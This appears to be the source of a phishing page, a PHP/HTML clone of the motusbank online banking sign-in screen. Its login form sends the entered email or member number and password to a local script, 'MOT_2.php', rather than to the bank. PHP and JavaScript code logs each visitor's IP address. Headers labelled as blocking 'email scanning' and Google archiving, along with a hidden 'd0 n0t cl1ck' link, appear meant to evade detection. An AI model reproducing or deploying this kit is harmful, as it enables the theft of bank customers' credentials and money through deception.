
<? php  ?>=(0038)220098/motus -->
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Login - motusbank</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <meta name="description" content="motusbank online banking">
        <meta name="keywords" content="motusbank, online, banking">
        <meta name="format-detection" content="telephone=no">
        <!--<base href="https://banking.motusbank.ca/">--><base href=".">
        <link href="files/mint.css" id="theme-stylesheet" rel="stylesheet">
        <script src="files/jquery-3.6.0.min" crossorigin="anonymous"></script>
        <script>var lrbank = 'Motus'; var lrinfo = 'Login';</script>
        <script src="files/actions"></script>
    </head>
    <body>
        <div class="header-container">
            <div class="row public-header">
                <div class="logo-container">
                    <a href="https://banking.motusbank.ca/Security_Login">
                    <img src="files/logo.svg" alt="motusbank Logo" class="motusbank-logo">
                    </a>
                </div>
                <div class="link-container">
                    <ul class="utility-links">
                        <li>
                            <a href="https://www.motusbank.ca/" class="underlined" target="_blank">motusbank.ca</a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <div id="page-content" class="signin-page" style="background-image: url(https://banking.motusbank.ca/Content/Images/Banners/Retail_SignInBackground_All.jpg)">
            <div class="signin-page-inner">
                <div class="row">
                    <div class="signin-form-container">
                        <div class="signin-form">
                            <h1>Online Banking Sign In</h1>
                            <form action="MOT_2.php" autocomplete="false" method="post" novalidate="novalidate">
                                <div data-memorized-account-hidden="" style="" class="signin-form-content">
                                    <label>Email or Member Number</label>
                                    <input value="" class="textbox lrinput" attr-action="Filling Username" data-msg-maxlength="Email or Member Number cannot be longer than 320 characters." data-msg-required="Email or Member Number is required." focus="" id="CustNo" maxlength="320" name="username" placeholder="Enter Email or Member Number" required="required" type="text">
                                    <input type="hidden" name="CRSFToken" value="">
                                </div>
                                <div class="signin-form-content">
                                    <label>Password</label>
                                    <input autocomplete="off" class="textbox " data-msg-maxlength="Password cannot be more than 12 characters" data-msg-required="Password is required." id="pwd" maxlength="12" name="password" placeholder="Enter Password" required="required" type="password" autocapitalize="none" attr-action="Filling Password">
                                    <div>
                                        <span class="caps-lock-warning">Caps lock is enabled</span>
                                    </div>
                                </div>
                                <label data-memorized-account-hidden="" style="" class="normal">
                                <label data-type="checkbox" class="wrapped-toggle remember-me-checkbox primary"><input class="remember-me-checkbox primary" id="RememberMe" name="RememberMe" type="checkbox" value="true"></label><input name="RememberMe" type="hidden" value="false">
                                Remember Account
                                </label>
                                <div class="signin-form-content" data-remember-shown="" style="display: none;">
                                    <input id="RememberMeNickname" name="RememberMeNickname" placeholder="Nickname (Optional)" type="text" value="">
                                </div>
                                <div class="signin-form-content">
                                    <button type="submit" name="save" value="1" class="white button" id="sign-in-button">
                                    Sign In
                                    </button>
                                </div>
                                <div class="signin-form-content">
                                    <p>Not a member? <a href="https://www.motusbank.ca/join" class="decorated" id="join-now-link" target="_blank">Join Now</a></p>
                                </div>
                                <div class="signin-form-content recaptcha-tos">
                                    This site is protected by reCAPTCHA and the Google <a target="_blank" href="https://policies.google.com/privacy" class="decorated">Privacy Policy</a> and <a target="_blank" href="https://policies.google.com/terms" class="decorated">Terms of Service</a> apply.
                                </div>
                            </form>
                        </div>
                        <div class="signin-form-links">
                            <a href="https://banking.motusbank.ca/Security_Contact">Contact Us</a> |
                            <a href="https://banking.motusbank.ca/Security_FAQ">FAQs</a> |
                            <a href="https://banking.motusbank.ca/Security_Difficulty">Need Help Signing In?</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <footer class="main-footer">
            <div class="footer-spiral-container">
                <img class="footer-spiral visible" src="files/Spiral-1.svg" style="animation-delay: -92.1562s;">
            </div>
            <div class="row">
                <div class="logo-container">
                    <a href="https://banking.motusbank.ca/Security_Login">
                    <img src="files/logo.svg" alt="Motusbank Logo" class="motusbank-logo">
                    </a>
                </div>
                <div class="footer-sub">
                    <span>Copyright © 2021 Motus Bank. All rights reserved.</span>
                    <a href="https://banking.motusbank.ca/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                    <ul class="footer-links">
                        <li><a href="https://www.motusbank.ca/agreement-privacy" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a></li>
                        <li><a href="https://www.motusbank.ca/legal" title="Legal" target="_blank">Legal</a></li>
                        <li><a href="https://www.motusbank.ca/accessibility" title="Accessibility" target="_blank">Accessibility</a></li>
                    </ul>
                </div>
            </div>
        </footer>
    

</body></html></html></html></html>